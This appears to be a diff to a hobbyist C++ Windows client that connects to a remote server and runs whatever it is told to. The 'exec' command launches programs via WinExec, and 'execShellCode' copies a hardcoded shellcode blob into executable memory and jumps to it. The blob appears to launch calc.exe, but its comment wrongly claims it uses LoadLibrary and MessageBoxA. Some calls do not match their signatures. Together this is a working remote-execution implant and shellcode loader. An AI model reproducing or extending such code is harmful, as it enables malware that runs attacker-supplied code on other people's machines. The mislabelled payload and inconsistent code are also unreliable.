@@ -102,7 +102,18 @@ std::string Client::receiveData()
     if (result > 0) 
     {
         // Success - create string from the received data
-        return std::string(recvBuffer_, result);
+        //return std::string(recvBuffer_, result);
+        // TODO: this might only be happening becuz im using ncat to send messages rn
+        std::string received(recvBuffer_, result);
+        if (!received.empty() && received.back() == '\n') 
+        {
+            received.pop_back();
+            if (!received.empty() && received.back() == '\r') 
+            {
+                received.pop_back();
+            }
+        }
+        return received;
     } 
     else if (result == 0) 
     {
@@ -150,6 +161,83 @@ std::string receiveDataNonBlocking() {
 }
 
 */
+// void Client::executeShellCode()
+// void Client::executeShellCode()
+// TODO: make this function polymorphic (meaning it can execute shell code, exe, or other stuff)
+void Client::execute(std::string program)
+{
+	WinExec(program.c_str(), SW_SHOW);
+}
+
+//#include <windows.h>
+//#include <vector>
+
+//void executeShellcode(std::vector<uint8_t>& shellcode) {
+/*
+void executeShellcode(std::vector<uint8_t>& fart_shellcode) {
+
+    unsigned char shellcode[] =
+        "\x31\xc0\x50\x68\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68\x48\x65"
+        "\x6c\x6c\x89\xe1\x50\x51\xb8\xc7\x93\xbf\x77\xff\xd0";
+
+    // Size: 29 bytes
+    // Shows: "Hello World!" in a message box
+
+
+    // Allocate executable memory
+    void* exec_mem = VirtualAlloc(
+        NULL, 
+        shellcode.size(), 
+        MEM_COMMIT | MEM_RESERVE, 
+        PAGE_EXECUTE_READWRITE
+    );
+    
+    if (!exec_mem) {
+        return; // Allocation failed
+    }
+    
+    // Copy shellcode
+    memcpy(exec_mem, shellcode.data(), shellcode.size());
+    
+    // Execute - Method 1 (typedef)
+    typedef void (*ShellcodeFunc)();
+    ShellcodeFunc func = (ShellcodeFunc)exec_mem;
+    func();
+    
+    // Cleanup (optional)
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+}*/
+
+#include <vector>
+
+// TODO: fix... add debugs, console/tcp connection dies everytime
+void executeShellcode() {
+unsigned char shellcode[] =
+"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
+"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
+"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
+"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
+"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
+"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
+"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
+"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
+"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
+"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
+"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
+"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
+"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
+"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+
+// Size: 176 bytes
+// Uses: LoadLibrary + MessageBoxA 
+    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), 
+                                 MEM_COMMIT | MEM_RESERVE, 
+                                 PAGE_EXECUTE_READWRITE);
+    memcpy(exec_mem, shellcode, sizeof(shellcode));
+    
+    // Execute
+    ((void(*)())exec_mem)();
+}
 
 void Client::run(const std::string& host, const std::string& port)
 {
@@ -171,14 +259,20 @@ void Client::run(const std::string& host, const std::string& port)
     while (connected_) {
         try {
             std::string command = receiveData();
-            //sendData(command);
-			if (command == "exec")
-			{
-				execute();
-			}
-            std::cout << "Server command: " << command << std::endl;
-            
-        } catch (const std::exception& e) {
+
+                //
+                // sendData(command);
+                if (command == "exec")
+                {
+                    std::cout << "poop" << command << std::endl;
+                    execute();
+                }
+                else if (command == "execShellCode")
+                {
+                    executeShellcode();
+                }
+                std::cout << "Server command: " << command << std::endl;
+            } catch (const std::exception& e) {
             std::cerr << "Connection lost: " << e.what() << std::endl;
             break;
         }
@@ -187,13 +281,6 @@ void Client::run(const std::string& host, const std::string& port)
     std::cout << "Disconnected from server" << std::endl;
 }
 
-// void Client::executeShellCode()
-// void Client::executeShellCode()
-// TODO: make this function polymorphic (meaning it can execute shell code, exe, or other stuff)
-void Client::execute(std::string& filename="notepad.exe")
-{
-	WinExec(filename, SW_SHOW);
-}
 
 // void Client::getInfo() ? 
 void Client::getSystemInfo()
